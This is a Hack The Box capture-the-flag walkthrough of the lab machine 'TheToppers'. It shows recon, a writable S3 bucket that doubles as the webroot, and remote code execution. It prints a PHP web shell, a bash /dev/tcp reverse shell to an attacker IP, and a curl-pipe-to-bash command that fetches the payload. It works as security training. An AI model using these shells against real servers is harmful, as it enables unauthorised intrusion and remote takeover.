# ☁️ Hack The Box – TheToppers (S3-Based Exploitation)

**Machine Type**: Linux
**Solved By**: Akshat Nigam
**Category**: AWS S3 | Misconfiguration | Remote Code Execution | Web Exploitation
**Difficulty**: Easy
**Attack Surface**: Apache Web Server, S3 Bucket, PHP

---

## 🔍 1. Initial Recon

As always, I started with an Nmap scan on the IP provided:

```bash
nmap -sC -sV -p- <target-ip>
```

### 🔓 Open Ports:

* **Port 22** – SSH (OpenSSH)
* **Port 80** – HTTP (Apache Web Server)

When I visited the website hosted at `http://<target-ip>`, the footer revealed an email contact, which included the domain: **thetoppers.htb**.

I added it to my `/etc/hosts` file:

```bash
echo "<target-ip> thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 2. Enumerating Subdomains with Gobuster

I ran Gobuster to brute-force potential subdomains:

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### ✅ Found Subdomain:

```
s3.thetoppers.htb
```

---

## 💡 3. Understanding S3

**Amazon S3 (Simple Storage Service)** allows users to store and retrieve data in the cloud via "buckets". It is often used for:

* Static website hosting
* Backup and storage
* Software/media distribution

Here, the `s3.thetoppers.htb` domain appeared to be hosting an **S3-compatible bucket**.

---

## 🧰 4. Setting Up AWS CLI

To interact with this bucket, I installed the **AWS CLI**:

```bash
sudo apt install awscli
```

Then configured it (dummy values work since auth wasn't enforced):

```bash
aws configure
# Access Key ID: dummy
# Secret Access Key: dummy
# Region: us-east-1
# Output: json
```

---

## 📂 5. Bucket Enumeration

Using the AWS CLI, I listed available buckets via a **custom endpoint**:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

### 📦 Result:

```
2025-07-01 14:53:20 thetoppers.htb
```

Then I listed contents of the bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

It looked like the entire **webroot** of the main website was stored here. 👀

---

## 💣 6. Uploading PHP Web Shell (RCE)

Since this bucket was writeable and linked to the live web server, I decided to upload a PHP web shell.

### 🔥 PHP RCE Payload:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### 📤 Upload to Bucket:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

I confirmed the upload by visiting:

```
http://thetoppers.htb/shell.php
```

To test it, I executed:

```
http://thetoppers.htb/shell.php?cmd=id
```

✅ Command output verified successful **Remote Code Execution**.

---

## 📞 7. Getting a Reverse Shell

### 🐚 Reverse Shell Payload:

Create a shell script on your local machine:

```bash
echo 'bash -i >& /dev/tcp/<your-ip>/1337 0>&1' > shell.sh
```

### 1. Start a Netcat Listener:

```bash
nc -nlvp 1337
```

### 2. Start a Python Web Server:

```bash
python3 -m http.server 8000
```

### 3. Trigger Reverse Shell via shell.php:

```bash
http://thetoppers.htb/shell.php?cmd=curl http://<your-ip>:8000/shell.sh | bash
```

🔥 Boom! You get a reverse shell as the web user.

---

## 🧠 How It Works:

* `shell.php` executes any command passed via the `cmd` parameter.
* You serve `shell.sh` via Python HTTP server.
* Target machine downloads the script using `curl`.
* Pipe `| bash` executes it in-memory — no disk write needed.
* Netcat receives the callback.

---

## ✅ Summary

| Step | Action                                                |
| ---- | ----------------------------------------------------- |
| 1    | Nmap scan reveals open ports (22, 80)                 |
| 2    | Subdomain `s3.thetoppers.htb` found via Gobuster      |
| 3    | AWS CLI used to interact with misconfigured bucket    |
| 4    | Upload PHP shell using `aws s3 cp`                    |
| 5    | Execute commands via `cmd` param                      |
| 6    | Serve reverse shell and catch connection using Netcat |

---

## 🚩 Outcome

* ✅ RCE via PHP shell
* ✅ Reverse shell access as web user

> 💥 A classic case of insecure AWS S3 bucket usage leading to full remote compromise.

---

🔐 Stay safe and **never leave public write access** on cloud buckets!

---
